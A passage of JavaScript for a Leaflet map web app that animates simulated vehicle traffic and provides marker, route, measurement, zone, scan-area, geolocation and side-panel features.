        const config = road.config;

        // Random starting position along the road
        const progress = Math.random();
        const direction = road.oneway ? 1 : (Math.random() > 0.5 ? 1 : -1);

        // Determine vehicle type
        const rand = Math.random();
        let vType, emoji, cssClass;
        if (rand < 0.5) {
            vType = 'car'; emoji = '🚗'; cssClass = 'veh-car';
        } else if (rand < 0.7) {
            vType = 'car2'; emoji = '🚙'; cssClass = 'veh-suv';
        } else if (rand < 0.82) {
            vType = 'taxi'; emoji = '🚕'; cssClass = 'veh-taxi';
        } else if (rand < 0.92) {
            vType = 'truck'; emoji = '🚚'; cssClass = 'veh-truck';
        } else if (rand < 0.96) {
            vType = 'bus'; emoji = '🚌'; cssClass = 'veh-bus';
        } else {
            vType = 'moto'; emoji = '🏍️'; cssClass = 'veh-moto';
        }

        // Speed with some variation
        const baseSpeed = vType === 'truck' || vType === 'bus' ? 0.7 : (vType === 'moto' ? 1.3 : 1.0);
        const speed = config.speed * baseSpeed * (0.6 + Math.random() * 0.8) * VEHICLE_SPEED_FACTOR;

        // Calculate initial position and heading
        const pos = getPositionOnRoad(road.coords, progress);
        if (!pos) return null;
        const heading = getHeadingOnRoad(road.coords, progress, direction);

        // Create the vehicle marker with emoji
        const icon = L.divIcon({
            className: 'vehicle-icon-marker',
            html: `<div class="vehicle-icon ${cssClass}" style="transform:rotate(${heading}deg)">${emoji}</div>`,
            iconSize: [20, 20],
            iconAnchor: [10, 10]
        });

        const marker = L.marker(pos, { icon, interactive: false });
        state.vehicleLayer.addLayer(marker);

        return {
            marker,
            road: road.coords,
            progress,
            speed,
            direction,
            type: vType
        };
    }

    function getHeadingOnRoad(coords, progress, direction) {
        if (coords.length < 2) return 0;
        const m = roadMetrics(coords);
        if (m.total === 0) return 0;
        const target = Math.min(Math.max(progress, 0), 1) * m.total;
        const i = segmentIndexAt(m, target);
        const dlat = coords[i + 1][0] - coords[i][0];
        const dlng = coords[i + 1][1] - coords[i][1];
        let angle = Math.atan2(dlng, dlat) * (180 / Math.PI);
        if (direction < 0) angle += 180;
        return angle;
    }

    // Road geometry never changes once loaded, so each road's cumulative
    // segment lengths are computed once and cached. The old code rebuilt that
    // table inside every call - 200+ vehicles x 60fps x a fresh array each
    // time, which was the main source of map jank.
    const roadMetricsCache = new WeakMap();

    function roadMetrics(coords) {
        let m = roadMetricsCache.get(coords);
        if (m) return m;
        const cum = new Float64Array(Math.max(coords.length - 1, 0));
        let total = 0;
        for (let i = 1; i < coords.length; i++) {
            const dx = coords[i][0] - coords[i - 1][0];
            const dy = coords[i][1] - coords[i - 1][1];
            total += Math.sqrt(dx * dx + dy * dy);
            cum[i - 1] = total;
        }
        m = { cum: cum, total: total };
        roadMetricsCache.set(coords, m);
        return m;
    }

    // Binary search instead of walking every segment.
    function segmentIndexAt(m, target) {
        let lo = 0, hi = m.cum.length - 1;
        while (lo < hi) {
            const mid = (lo + hi) >> 1;
            if (m.cum[mid] >= target) hi = mid; else lo = mid + 1;
        }
        return lo;
    }

    function getPositionOnRoad(coords, progress) {
        if (coords.length < 2) return null;

        const m = roadMetrics(coords);
        if (m.total === 0) return coords[0];

        const target = Math.min(Math.max(progress, 0), 1) * m.total;
        const i = segmentIndexAt(m, target);
        const prev = i === 0 ? 0 : m.cum[i - 1];
        const segLen = m.cum[i] - prev;
        const t = segLen > 0 ? (target - prev) / segLen : 0;
        const lat = coords[i][0] + t * (coords[i + 1][0] - coords[i][0]);
        const lng = coords[i][1] + t * (coords[i + 1][1] - coords[i][1]);
        return [lat, lng];
    }

    // =========================================
    // TRAFFIC ANIMATION LOOP
    // =========================================
    function startTrafficAnimation() {
        if (state.animationFrame) cancelAnimationFrame(state.animationFrame);

        // 20fps is visually identical for map markers and leaves the main
        // thread free, so the UI stays responsive while traffic runs.
        const FRAME_MS = 50;
        let lastTime = performance.now();

        function animate(currentTime) {
            if (currentTime - lastTime < FRAME_MS) {
                state.animationFrame = requestAnimationFrame(animate);
                return;
            }
            const deltaTime = (currentTime - lastTime) / 16.67; // normalize to ~60fps
            lastTime = currentTime;

            if (state.trafficActive && state.vehicles.length > 0) {
                // Adjust time based on real hour (more traffic during day)
                const hour = new Date().getHours();
                let timeFactor = 1;
                if (hour >= 7 && hour <= 9) timeFactor = 1.5; // Rush hour morning
                else if (hour >= 17 && hour <= 19) timeFactor = 1.5; // Rush hour evening
                else if (hour >= 23 || hour <= 5) timeFactor = 0.3; // Night
                else timeFactor = 1;

                state.vehicles.forEach(v => {
                    // Update progress
                    v.progress += v.speed * v.direction * deltaTime * timeFactor;

                    // Wrap around
                    if (v.progress > 1) {
                        v.progress = 0;
                    } else if (v.progress < 0) {
                        v.progress = 1;
                    }

                    // Update position and rotation
                    const pos = getPositionOnRoad(v.road, v.progress);
                    if (pos) {
                        v.marker.setLatLng(pos);
                        // Heading only changes when a vehicle turns, so update it
                        // on a slow cadence and cache the icon element.
                        if (Math.random() < 0.1) {
                            const heading = getHeadingOnRoad(v.road, v.progress, v.direction);
                            if (v.iconEl === undefined) {
                                const el = v.marker.getElement();
                                v.iconEl = el ? el.querySelector('.vehicle-icon') : null;
                            }
                            if (v.iconEl) v.iconEl.style.transform = `rotate(${heading}deg)`;
                        }
                    }
                });
            }

            state.animationFrame = requestAnimationFrame(animate);
        }

        state.animationFrame = requestAnimationFrame(animate);
    }

    // =========================================
    // LIVE STATS UI
    // =========================================
    function createLiveStatsUI() {
        const container = document.getElementById('map-container');

        const statsDiv = document.createElement('div');
        statsDiv.id = 'live-stats';
        statsDiv.innerHTML = `
            <div class="live-stat">
                <div class="live-stat-dot" style="background: #ffdd44;"></div>
                <span class="live-stat-text">VEH</span>
                <span class="live-stat-value" id="stat-vehicles">0</span>
            </div>
            <div class="live-stat">
                <div class="live-stat-dot" style="background: #ff6400;"></div>
                <span class="live-stat-text">ANT</span>
                <span class="live-stat-value" id="stat-towers">0</span>
            </div>
            <div class="live-stat">
                <div class="live-stat-dot" style="background: #00b4ff;"></div>
                <span class="live-stat-text">INF</span>
                <span class="live-stat-value" id="stat-infra">0</span>
            </div>
            <div class="live-stat">
                <div class="live-stat-dot" style="background: #00ffcc;"></div>
                <span class="live-stat-text">VES</span>
                <span class="live-stat-value" id="stat-vessels">0</span>
            </div>
        `;
        container.appendChild(statsDiv);

        // Loading indicator
        const loadingDiv = document.createElement('div');
        loadingDiv.id = 'data-loading';
        loadingDiv.className = 'hidden';
        loadingDiv.innerHTML = `
            <div class="spinner"></div>
            <span>DOWNLOADING DATA...</span>
        `;
        container.appendChild(loadingDiv);
    }

    function updateLiveStats() {
        const vEl = document.getElementById('stat-vehicles');
        const tEl = document.getElementById('stat-towers');
        const iEl = document.getElementById('stat-infra');
        const vesEl = document.getElementById('stat-vessels');
        if (vEl) vEl.textContent = state.liveStats.vehicles;
        if (tEl) tEl.textContent = state.liveStats.towers;
        if (iEl) iEl.textContent = state.liveStats.infra;
        if (vesEl) vesEl.textContent = state.liveStats.vessels;
    }

    function showDataLoading(show) {
        const el = document.getElementById('data-loading');
        if (el) el.classList.toggle('hidden', !show);
        state.dataLoading = show;
    }

    // =========================================
    // MAP EVENT HANDLERS
    // =========================================
    function onMapClick(e) {
        const { lat, lng } = e.latlng;
        switch (state.currentTool) {
            case 'marker': openMarkerForm(lat, lng); break;
            case 'route_draw': addRoutePoint(lat, lng); if (state.panelOpen === 'route') openPanel('route'); break;
            case 'measure': addMeasurePoint(lat, lng); break;
            case 'zone': addZonePoint(lat, lng); break;
            case 'scan': handleScanClick(lat, lng); break;
            case 'pan': fetchWeatherPopup(lat, lng, e.latlng); break;
        }
    }

    function onMapMouseMove(e) {
        const { lat, lng } = e.latlng;
        document.getElementById('coord-lat').textContent = formatDMS(lat, 'lat');
        document.getElementById('coord-lon').textContent = formatDMS(lng, 'lon');
    }

    function onMapMoveEnd() {
        const center = state.map.getCenter();
        document.getElementById('coord-lat').textContent = formatDMS(center.lat, 'lat');
        document.getElementById('coord-lon').textContent = formatDMS(center.lng, 'lon');

        if (state.mapLayers.vessels && !state.scanZone) {
            if (aisMoveTimer) clearTimeout(aisMoveTimer);
            aisMoveTimer = setTimeout(function() {
                aisMoveTimer = null;
                stopAISStream();
                startAISStream();
            }, 1200);
        }
    }

    function onMapZoomEnd() {
        document.getElementById('info-zoom').textContent = state.map.getZoom();
    }

    // =========================================
    // COORDINATE FORMATTING
    // =========================================
    function formatDMS(decimal, type) {
        const abs = Math.abs(decimal);
        const d = Math.floor(abs);
        const mFloat = (abs - d) * 60;
        const m = Math.floor(mFloat);
        const s = ((mFloat - m) * 60).toFixed(1);
        const dir = type === 'lat' ? (decimal >= 0 ? 'N' : 'S') : (decimal >= 0 ? 'E' : 'W');
        return `${d}°${m.toString().padStart(2, '0')}'${s.toString().padStart(4, '0')}"${dir}`;
    }

    function formatCoordShort(lat, lng) {
        return `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
    }

    function formatDistance(meters) {
        if (meters >= 1000) return (meters / 1000).toFixed(1) + ' km';
        return Math.round(meters) + ' m';
    }

    // =========================================
    // CLOCK
    // =========================================
    function initClock() {
        function update() {
            const now = new Date();
            const h = now.getHours().toString().padStart(2, '0');
            const m = now.getMinutes().toString().padStart(2, '0');
            const s = now.getSeconds().toString().padStart(2, '0');
            document.getElementById('time-display').textContent = `${h}:${m}:${s}`;
        }
        update();
        setInterval(update, 1000);
    }

    // =========================================
    // TOOLBAR
    // =========================================
    function initToolbar() {
        document.querySelectorAll('.tool-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                const tool = btn.dataset.tool;
                if (['layers', 'settings', 'units', 'cyber', 'comms', 'tracker', 'route', 'marker', 'measure', 'zone', 'csi'].includes(tool)) {
                    if (state.panelOpen === tool) closePanel();
                    else openPanel(tool);
                    return;
                }
                selectTool(tool);
            });
        });
    }

    function selectTool(tool) {
        state.currentTool = tool;

        if (tool !== 'route' && !state.routeDrawing && state.routePoints.length > 0) finishRoute();
        if (tool !== 'measure' && state.measurePoints) finishMeasure();
        if (tool !== 'zone' && state.zonePoints) finishZone();
        if (tool !== 'scan') { state.scanCorner1 = null; if (state.scanPreviewRect) { state.map.removeLayer(state.scanPreviewRect); state.scanPreviewRect = null; } }

        document.querySelectorAll('.tool-btn').forEach(b => {
            if (!['layers', 'settings', 'units', 'cyber', 'comms', 'tracker', 'route', 'marker', 'measure', 'zone', 'csi'].includes(b.dataset.tool)) {
                b.classList.toggle('active', b.dataset.tool === tool);
            }
        });

        document.querySelectorAll('.mobile-tool-btn').forEach(b => {
            b.classList.toggle('active', b.dataset.tool === tool);
        });

        document.getElementById('map').style.cursor = tool === 'pan' ? '' : 'crosshair';

        const names = {
            pan: 'NAVIGATION MODE', marker: 'PLACE MARKER',
            route: 'PLAN ROUTE', zone: 'DEFINE ZONE', measure: 'MEASURE DISTANCE',
            scan: '📡 CLICK 2 CORNERS TO DEFINE SCAN ZONE'
        };
        if (names[tool]) showToast(names[tool]);
    }

    // =========================================
    // SCAN ZONE (Draw Rectangle to Load Data)
    // =========================================
    function handleScanClick(lat, lng) {
        if (!state.scanCorner1) {
            // First corner
            state.scanCorner1 = [lat, lng];
            showToast('📍 CORNER 1 SET — CLICK ON THE OPPOSITE CORNER');

            // Add mousemove preview
            state.map.on('mousemove', onScanPreview);
        } else {
            // Second corner — create the scan zone
            state.map.off('mousemove', onScanPreview);
            if (state.scanPreviewRect) { state.map.removeLayer(state.scanPreviewRect); state.scanPreviewRect = null; }

            const corner2 = [lat, lng];
            const bounds = L.latLngBounds(state.scanCorner1, corner2);

            // Remove old scan zone
            if (state.scanZoneRect) state.map.removeLayer(state.scanZoneRect);

            // Draw the confirmed scan zone
            state.scanZoneRect = L.rectangle(bounds, {
                color: '#00ff41',
                weight: 2,
                fillColor: '#00ff41',
                fillOpacity: 0.05,
                dashArray: '8 4',
                interactive: false
            }).addTo(state.map);

            // Add label
            const center = bounds.getCenter();
            const width = state.map.distance(bounds.getSouthWest(), bounds.getSouthEast());
            const height = state.map.distance(bounds.getSouthWest(), bounds.getNorthWest());

            state.scanZone = bounds;
            state.scanCorner1 = null;

            showToast(`✅ SCAN ZONE: ${formatDistance(width)} x ${formatDistance(height)} — LOADING DATA...`);
            selectTool('pan');

            // Load data in the scan zone
            loadAllData();
        }
    }

    function onScanPreview(e) {
        if (!state.scanCorner1) return;
        const bounds = L.latLngBounds(state.scanCorner1, [e.latlng.lat, e.latlng.lng]);
        if (state.scanPreviewRect) {
            state.scanPreviewRect.setBounds(bounds);
        } else {
            state.scanPreviewRect = L.rectangle(bounds, {
                color: '#00ff41',
                weight: 1,
                fillColor: '#00ff41',
                fillOpacity: 0.08,
                dashArray: '4 4',
                interactive: false
            }).addTo(state.map);
        }
    }

    window.SGP.clearScanZone = function() {
        if (state.scanZoneRect) { state.map.removeLayer(state.scanZoneRect); state.scanZoneRect = null; }
        state.scanZone = null;
        stopAISStream();
        clearAllLiveData();
        showToast('SCAN ZONE CLEARED');
        if (state.panelOpen === 'layers') openPanel('layers');
        if (state.mapLayers.vessels) {
            startAISStream();
        }
    };

    // =========================================
    // MARKERS
    // =========================================
    function openMarkerForm(lat, lng) {
        const form = document.getElementById('marker-form');
        form.classList.remove('hidden');
        form.dataset.lat = lat;
        form.dataset.lng = lng;
        state.markerCounter++;
        document.getElementById('marker-name').value = `Punto-${state.markerCounter}`;
        document.getElementById('marker-type').value = 'friendly';
        document.getElementById('marker-notes').value = '';
        document.getElementById('marker-name').focus();
    }

    function initMarkerForm() {
        document.getElementById('btn-marker-cancel').addEventListener('click', closeMarkerForm);
        document.getElementById('btn-marker-save').addEventListener('click', saveMarker);
    }

    function closeMarkerForm() {
        document.getElementById('marker-form').classList.add('hidden');
    }

    function saveMarker() {
        const form = document.getElementById('marker-form');
        const lat = parseFloat(form.dataset.lat);
        const lng = parseFloat(form.dataset.lng);
        const name = document.getElementById('marker-name').value || `Punto-${state.markerCounter}`;
        const type = document.getElementById('marker-type').value;
        const notes = document.getElementById('marker-notes').value;
        addMarkerToMap(lat, lng, name, type, notes);
        closeMarkerForm();
        showToast(`MARKER "${name.toUpperCase()}" PLACED`);
    }

    function addMarkerToMap(lat, lng, name, type, notes) {
        const config = MARKER_TYPES[type];
        const id = 'marker-' + Date.now();
        const icon = L.divIcon({
            className: 'tactical-marker',
            html: `<div class="marker-mil type-${type}">${config.icon}</div><div class="marker-label">${name}</div>`,
            iconSize: [32, 32], iconAnchor: [16, 16]
        });

        const marker = L.marker([lat, lng], { icon })
            .addTo(state.map)
            .bindPopup(`
                <div class="popup-title">${name.toUpperCase()}</div>
                <div class="popup-info">
                    <strong>Type:</strong> ${config.label}<br>
                    ${notes ? `<strong>Notes:</strong> ${notes}<br>` : ''}
                    <strong>Time:</strong> ${new Date().toLocaleTimeString()}
                </div>
                <div class="popup-coords">${formatDMS(lat, 'lat')} | ${formatDMS(lng, 'lon')}</div>
                <button class="popup-btn-delete" onclick="window.SGP.deleteMarker('${id}')">✕ DELETE</button>
            `);

        state.markers.push({ id, marker, name, type, notes, lat, lng });
        saveAllMarkers();
        if (state.panelOpen === 'units') openPanel('units');
    }

    // window.SGP already initialized at top of IIFE
    window.SGP.deleteMarker = function (id) {
        const idx = state.markers.findIndex(m => m.id === id);
        if (idx !== -1) {
            state.map.removeLayer(state.markers[idx].marker);
            state.markers.splice(idx, 1);
            saveAllMarkers();
            showToast('MARKER DELETED');
            if (state.panelOpen === 'units') openPanel('units');
        }
    };

    // =========================================
    // ROUTES
    // =========================================
    state.routePoints = [];
    state.routeLine = null;
    state.routeMarkers = [];

    function addRoutePoint(lat, lng) {
        state.routePoints.push([lat, lng]);
        const cfg = state.routeConfig;
        const dot = L.circleMarker([lat, lng], {
            radius: 5, color: cfg.color, fillColor: cfg.color, fillOpacity: 0.8, weight: 2
        }).addTo(state.map);
        state.routeMarkers.push(dot);

        if (state.routePoints.length >= 2) {
            if (state.routeLine) state.map.removeLayer(state.routeLine);
            state.routeLine = L.polyline(state.routePoints, {
                color: cfg.color, weight: cfg.weight, dashArray: getRouteDashArray(), opacity: 0.8
            }).addTo(state.map);
            const totalDist = calculateRouteDistance(state.routePoints);
            showToast(`ROUTE: ${formatDistance(totalDist)}`);
        }
    }

    function finishRoute() {
        if (state.routePoints.length >= 2) {
            const totalDist = calculateRouteDistance(state.routePoints);
            state.routes.push({
                id: 'route-' + Date.now(), points: [...state.routePoints],
                line: state.routeLine, markers: [...state.routeMarkers], distance: totalDist
            });
            saveAllRoutes();
            showToast(`ROUTE SAVED: ${formatDistance(totalDist)}`);
        } else {
            state.routeMarkers.forEach(m => state.map.removeLayer(m));
            if (state.routeLine) state.map.removeLayer(state.routeLine);
        }
        state.routePoints = []; state.routeLine = null; state.routeMarkers = [];
    }

    function calculateRouteDistance(points) {
        let total = 0;
        for (let i = 1; i < points.length; i++) {
            total += state.map.distance(L.latLng(points[i - 1]), L.latLng(points[i]));
        }
        return total;
    }

    function formatDistance(meters) {
        return meters >= 1000 ? (meters / 1000).toFixed(2) + ' km' : Math.round(meters) + ' m';
    }

    // =========================================
    // MEASUREMENT
    // =========================================
    state.measurePoints = null;
    state.measureLine = null;
    state.measureMarkers = [];

    function addMeasurePoint(lat, lng) {
        if (!state.measurePoints) state.measurePoints = [];
        state.measurePoints.push([lat, lng]);
        const dot = L.circleMarker([lat, lng], {
            radius: 4, color: '#ffaa00', fillColor: '#ffaa00', fillOpacity: 0.8, weight: 2
        }).addTo(state.map);
        state.measureMarkers.push(dot);

        if (state.measurePoints.length >= 2) {
            if (state.measureLine) state.map.removeLayer(state.measureLine);
            state.measureLine = L.polyline(state.measurePoints, {
                color: '#ffaa00', weight: 2, dashArray: '5 5', opacity: 0.7
            }).addTo(state.map);
            const totalDist = calculateRouteDistance(state.measurePoints);
            showToast(`📏 DISTANCE: ${formatDistance(totalDist)}`);

            const last = state.measurePoints.length - 1;
            const midLat = (state.measurePoints[last - 1][0] + state.measurePoints[last][0]) / 2;
            const midLng = (state.measurePoints[last - 1][1] + state.measurePoints[last][1]) / 2;
            const segDist = state.map.distance(
                L.latLng(state.measurePoints[last - 1]), L.latLng(state.measurePoints[last])
            );
            const label = L.marker([midLat, midLng], {
                icon: L.divIcon({
                    className: 'route-distance-label', html: formatDistance(segDist),
                    iconSize: [80, 20], iconAnchor: [40, 10]
                })
            }).addTo(state.map);
            state.measureMarkers.push(label);
        }
        // Live-update the measure panel
        if (state.panelOpen === 'measure') openPanel('measure');
    }

    function finishMeasure() {
        if (state.measurePoints && state.measurePoints.length >= 2) {
            showToast(`TOTAL DISTANCE: ${formatDistance(calculateRouteDistance(state.measurePoints))}`);
        }
        state.measureMarkers.forEach(m => state.map.removeLayer(m));
        if (state.measureLine) state.map.removeLayer(state.measureLine);
        state.measurePoints = null; state.measureLine = null; state.measureMarkers = [];
    }

    // =========================================
    // ZONES
    // =========================================
    state.zonePoints = null;
    state.zoneLine = null;
    state.zoneMarkers = [];

    function addZonePoint(lat, lng) {
        if (!state.zonePoints) state.zonePoints = [];
        state.zonePoints.push([lat, lng]);
        var zColor = state.zoneColor || '#ff2d2d';
        const dot = L.circleMarker([lat, lng], {
            radius: 4, color: zColor, fillColor: zColor, fillOpacity: 0.8, weight: 2
        }).addTo(state.map);
        state.zoneMarkers.push(dot);

        if (state.zonePoints.length >= 2) {
            if (state.zoneLine) state.map.removeLayer(state.zoneLine);
            const pts = [...state.zonePoints, state.zonePoints[0]];
            state.zoneLine = L.polyline(pts, {
                color: zColor, weight: 2, dashArray: '8 4', opacity: 0.6
            }).addTo(state.map);
        }
        if (state.zonePoints.length >= 3) {
            showToast(`🔲 ZONE: ${state.zonePoints.length} VERTICES — Click CLOSE ZONE to finish`);
        }
        // Live-update the zone panel
        if (state.panelOpen === 'zone') openPanel('zone');
    }

    function finishZone() {
        if (state.zonePoints && state.zonePoints.length >= 3) {
            if (state.zoneLine) state.map.removeLayer(state.zoneLine);
            state.zoneMarkers.forEach(m => state.map.removeLayer(m));
            var zColor = state.zoneColor || '#ff2d2d';
            var zOpacity = (state.zoneFillOpacity || 10) / 100;
            const polygon = L.polygon(state.zonePoints, {
                color: zColor, fillColor: zColor, fillOpacity: zOpacity, weight: 2, dashArray: '8 4'
            }).addTo(state.map);
            state.zones.push({ id: 'zone-' + Date.now(), points: [...state.zonePoints], polygon });
            saveAllZones();
            showToast('✅ ZONE DEFINED — ' + state.zonePoints.length + ' vertices');
        } else {
            if (state.zoneLine) state.map.removeLayer(state.zoneLine);
            state.zoneMarkers.forEach(m => state.map.removeLayer(m));
        }
        state.zonePoints = null; state.zoneLine = null; state.zoneMarkers = [];
    }

    // =========================================
    // GEOLOCATION
    // =========================================
    function initGeolocation() {
        if ('geolocation' in navigator) {
            state.watchId = navigator.geolocation.watchPosition(
                onPositionUpdate, onPositionError,
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
            );
        }
        if ('DeviceOrientationEvent' in window) {
            window.addEventListener('deviceorientation', onDeviceOrientation);
        }
    }

    function onPositionUpdate(pos) {
        const { latitude, longitude, altitude, speed, heading } = pos.coords;
        state.userPosition = { lat: latitude, lng: longitude };
        document.getElementById('gps-status').classList.add('active');
        document.getElementById('info-alt').textContent = altitude ? `${Math.round(altitude)} m` : '-- m';
        document.getElementById('info-speed').textContent = speed ? `${(speed * 3.6).toFixed(1)} km/h` : '0.0 km/h';
        if (heading) document.getElementById('info-heading').textContent = `${Math.round(heading)}°`;

        if (state.userMarker) {
            state.userMarker.setLatLng([latitude, longitude]);
        } else {
            const userIcon = L.divIcon({
                className: 'user-position-marker',
                html: `<div style="width:20px;height:20px;background:rgba(0,180,255,0.3);border:2px solid #00b4ff;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 15px rgba(0,180,255,0.5);animation:dot-pulse 2s infinite;"><div style="width:6px;height:6px;background:#00b4ff;border-radius:50%;"></div></div>`,
                iconSize: [20, 20], iconAnchor: [10, 10]
            });
            state.userMarker = L.marker([latitude, longitude], { icon: userIcon }).addTo(state.map);
        }
    }

    function onPositionError(err) { console.warn('Geolocation error:', err.message); }

    function onDeviceOrientation(event) {
        let heading = event.alpha;
        if (heading !== null) {
            if (event.webkitCompassHeading) heading = event.webkitCompassHeading;
            state.heading = heading;
            document.getElementById('compass-arrow').style.transform = `rotate(${-heading}deg)`;
            document.getElementById('compass-bearing').textContent = `${Math.round(heading).toString().padStart(3, '0')}°`;
            document.getElementById('info-heading').textContent = `${Math.round(heading)}°`;
        }
    }

    // =========================================
    // BOTTOM BAR
    // =========================================
    function initBottomBar() {
        document.querySelectorAll('.bottom-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                switch (btn.dataset.action) {
                    case 'locate': locateUser(); break;
                    case 'alert': sendAlert(); break;
                    case 'sos': activateSOS(); break;
                    case 'comms': openPanel('comms'); break;
                    case 'shop': window.open('https://sgpcard.com/', '_blank'); break;
                    case 'devices': openPanel('devices'); break;
                }
            });
        });
    }

    function locateUser() {
        if (state.userPosition) {
            state.map.flyTo([state.userPosition.lat, state.userPosition.lng], 16, { duration: 1.5 });
            showToast('CENTERING ON CURRENT POSITION');
        } else {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    state.map.flyTo([pos.coords.latitude, pos.coords.longitude], 16, { duration: 1.5 });
                    onPositionUpdate(pos);
                    showToast('POSITION ACQUIRED');
                },
                () => showToast('ERROR: GPS NOT AVAILABLE'),
                { enableHighAccuracy: true }
            );
        }
    }

    function sendAlert() {
        showToast('⚡ ALERTA ENVIADA A TODAS LAS UNIDADES');
        const mapEl = document.getElementById('map');
        mapEl.style.boxShadow = '0 0 40px rgba(255, 170, 0, 0.5) inset';
        setTimeout(() => { mapEl.style.boxShadow = ''; }, 1000);
    }

    let sosActive = false;
    function activateSOS() {
        sosActive = !sosActive;
        if (sosActive) {
            showToast('🔴 SOS ACTIVATED — TRANSMITTING POSITION');
            document.getElementById('map').style.boxShadow = '0 0 60px rgba(255, 45, 45, 0.4) inset';
            document.querySelector('.bottom-btn.emergency').style.background = 'rgba(255, 45, 45, 0.2)';
            const pos = state.userPosition || state.map.getCenter();
            addMarkerToMap(pos.lat, pos.lng, 'SOS', 'hazard', 'EMERGENCY SIGNAL ACTIVE');
        } else {
            showToast('SOS DEACTIVATED');
            document.getElementById('map').style.boxShadow = '';
            document.querySelector('.bottom-btn.emergency').style.background = '';
        }
    }

    // =========================================
    // SIDE PANEL
    // =========================================
    function initPanelClose() {
        document.getElementById('btn-close-panel').addEventListener('click', closePanel);
    }

    function openPanel(panelType) {
        const panel = document.getElementById('side-panel');
        const title = document.getElementById('panel-title');
        const body = document.getElementById('panel-body');
        state.panelOpen = panelType;
        panel.classList.remove('hidden');

        document.querySelectorAll('.tool-btn').forEach(b => {
            if (['layers', 'settings', 'units', 'cyber', 'comms', 'tracker', 'route', 'marker', 'measure', 'zone', 'csi', 'devices'].includes(b.dataset.tool)) {
                b.classList.toggle('active', b.dataset.tool === panelType);
            }
        });

        switch (panelType) {
            case 'units': title.textContent = 'UNITS & MARKERS'; body.innerHTML = renderUnitsPanel(); break;
            case 'layers': title.textContent = 'LAYERS & LIVE DATA'; body.innerHTML = renderLayersPanel(); initLayerToggles(); break;
            case 'settings': title.textContent = 'CONFIGURATION'; body.innerHTML = renderSettingsPanel(); break;
            case 'comms': title.textContent = 'WALKIE-TALKIE'; body.innerHTML = renderCommsPanel(); initCommsPanel(); break;
            case 'tracker': title.textContent = 'GPS TRACKER'; body.innerHTML = renderTrackerPanel(); initTrackerPanel(); break;
            case 'cyber': title.textContent = 'CYBER MODULE'; body.innerHTML = renderCyberPanel(); initCyberTabs(); break;
            case 'route': title.textContent = 'ROUTE PLANNER'; body.innerHTML = renderRoutePanel(); initRoutePanel(); break;
            case 'marker': title.textContent = 'MARKER MANAGER'; body.innerHTML = renderMarkerPanel(); break;
            case 'measure': title.textContent = 'MEASUREMENT TOOLS'; body.innerHTML = renderMeasurePanel(); break;
            case 'zone': title.textContent = 'ZONE PLANNER'; body.innerHTML = renderZonePanel(); break;
            case 'csi': title.textContent = 'CSI ANALYSIS'; body.innerHTML = renderCSIPanel(); initCSIPanel(); break;
            case 'devices': title.textContent = 'SGP DEVICES'; body.innerHTML = renderDevicesPanel(); initDevicesPanel(); break;
        }
    }

    function closePanel() {
        const panel = document.getElementById('side-panel');
        panel.classList.add('hidden');
        panel.classList.remove('panel-fullscreen');
        document.querySelectorAll('.tool-btn').forEach(b => {
            if (['layers', 'settings', 'units', 'cyber', 'comms', 'tracker', 'route', 'marker', 'measure', 'zone', 'csi', 'devices'].includes(b.dataset.tool)) b.classList.remove('active');
        });
        state.panelOpen = null;
    }

    window.SGP.togglePanelFullscreen = function() {
        const panel = document.getElementById('side-panel');
        panel.classList.toggle('panel-fullscreen');
        const btn = document.getElementById('btn-fullscreen-panel');
        const isFs = panel.classList.contains('panel-fullscreen');
        if (btn) {
            btn.innerHTML = isFs
                ? '<svg viewBox="0 0 24 24"><path d="M5 16h3v3h2v-5H5v2zm3-8H5v2h5V5H8v3zm6 11h2v-3h3v-2h-5v5zm2-11V5h-2v5h5V8h-3z"/></svg>'
                : '<svg viewBox="0 0 24 24"><path d="M7 14H5v5h5v-2H7v-3zm-2-4h2V7h3V5H5v5zm12 7h-3v2h5v-5h-2v3zM14 5v2h3v3h2V5h-5z"/></svg>';
        }
    };

    function renderUnitsPanel() {
        if (state.markers.length === 0) {
            return `<div style="text-align:center;padding:40px 20px;"><div style="font-size:2rem;margin-bottom:12px;opacity:0.3;">◇</div><p style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim);letter-spacing:1px;">NO MARKERS<br>Use the MARKER tool</p></div>`;
        }
        let html = '';
        const groups = {};
        state.markers.forEach(m => { if (!groups[m.type]) groups[m.type] = []; groups[m.type].push(m); });
        for (const [type, markers] of Object.entries(groups)) {
            const config = MARKER_TYPES[type];
            html += `<div class="panel-section"><div class="panel-section-title">${config.label} (${markers.length})</div>${markers.map(m => `
                <div class="panel-item" onclick="window.SGP.focusMarker('${m.id}')">
                    <div class="panel-item-icon marker-${type}">${config.icon}</div>
                    <div class="panel-item-info"><div class="panel-item-name">${m.name}</div><div class="panel-item-detail">${formatCoordShort(m.lat, m.lng)}</div></div>
                    <div class="panel-item-actions"><button onclick="event.stopPropagation(); window.SGP.deleteMarker('${m.id}')"><svg viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg></button></div>
                </div>`).join('')}</div>`;
        }
        return html;
    }

    window.SGP.focusMarker = function (id) {
        const m = state.markers.find(m => m.id === id);
        if (m) { state.map.flyTo([m.lat, m.lng], 16, { duration: 1 }); m.marker.openPopup(); }
    };

    function renderLayersPanel() {
        const scanActive = !!state.scanZone;
        const scanInfo = scanActive ? (() => {
            const w = state.map.distance(state.scanZone.getSouthWest(), state.scanZone.getSouthEast());
            const h = state.map.distance(state.scanZone.getSouthWest(), state.scanZone.getNorthWest());
            return `${formatDistance(w)} x ${formatDistance(h)}`;
        })() : '';

        // Radio stations HTML
        let radioHTML = '';
        if (state.radioStations.length > 0) {
            radioHTML = state.radioStations.slice(0, 20).map(s => {
                const isPlaying = state.currentStation === s.url_resolved;
                return `<div class="radio-station ${isPlaying ? 'active' : ''}" onclick="window.SGP.playRadio('${s.url_resolved?.replace(/'/g, "\\'")}', '${(s.name || '').replace(/'/g, "\\'")}')">
                    <span class="radio-icon">${isPlaying ? '⏸' : '▶'}</span>
                    <div class="radio-info">
                        <div class="radio-name">${s.name || 'Unknown'}</div>
                        <div class="radio-meta">${s.codec || ''} ${s.bitrate ? s.bitrate + 'kbps' : ''} · ${s.country || ''}</div>
                    </div>
